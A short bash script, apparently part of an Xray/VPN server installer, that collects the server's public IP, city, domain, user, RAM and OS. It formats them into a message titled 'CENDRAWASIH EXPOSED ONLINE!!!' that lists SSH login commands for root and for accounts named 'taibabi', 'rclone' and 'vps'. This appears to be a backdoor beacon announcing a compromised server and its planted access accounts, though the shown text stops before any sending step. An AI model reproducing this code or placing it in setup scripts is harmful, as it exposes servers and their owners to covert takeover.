#!/bin/bash
TIME=$(date +'%Y-%m-%d %H:%M:%S')
MYIP=$(wget -qO- ipinfo.io/ip)
domain=$(cat /etc/xray/domain)
CITY=$(curl -s ipinfo.io/city)
NAMES=$(whoami)
RAMMS=$(free -m | awk 'NR==2 {print $2}')
NAMECOM=$(wget -qO- ipinfo.io/ip)
OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')

message="
<u>CENDRAWASIH EXPOSED</u> <b>ONLINE!!!</b>
<code>TIME    : </code><code>${TIME}</code>
<code>DOMAIN  : </code><code>${domain}</code>
<code>IP VPS  : </code><code>${MYIP}</code>
<code>LOKASI  : </code><code>${CITY}</code>
<code>USER    : </code><code>${NAMES}</code>
<code>RAM     : </code><code>${RAMMS}MB</code>
<code>LINUX   : </code><code>${OS}</code>
<code>SSH-1   : </code><code>ssh root@${MYIP} -qvi taibabi</code>
<code>SSH-2   : </code><code>ssh taibabi@${MYIP} -qv</code>
<code>SSH-2   : </code><code>ssh rclone@${MYIP} -qv</code>
<code>SSH-2   : </code><code>ssh vps@${MYIP} -qv</code>
"
